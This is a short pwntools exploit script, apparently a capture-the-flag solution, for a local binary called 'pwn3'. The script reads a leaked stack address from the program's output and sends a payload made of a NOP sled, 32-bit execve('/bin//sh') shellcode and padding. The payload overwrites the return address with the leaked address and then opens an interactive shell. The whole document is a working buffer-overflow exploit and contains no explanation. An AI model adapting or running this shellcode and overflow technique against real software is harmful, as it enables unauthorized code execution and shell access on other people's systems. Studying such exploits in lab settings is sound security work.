from pwn import *

io = process('./pwn3')

buffer = 302
nops = b"\x90"*10

shellcode = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

padding = b"A"* (buffer - len(nops) - len(shellcode))

payload = nops + shellcode + padding

# -- Exploit Start --
# -------------------

io.readuntil(b"Take this, you might need it on your journey ")
leak_addr_raw = io.readuntil(b"!")
leak_addr_strip = leak_addr_raw.partition(b"!")[::1]
leak_addr = int(leak_addr_strip[0],16)

#print(f"RAW: {leak_addr_raw}")
#print(f"STRIPPED: {leak_addr_strip}")
print(f"FINAL: {hex(leak_addr)}")

io.sendline(payload + p32(leak_addr))


io.interactive()

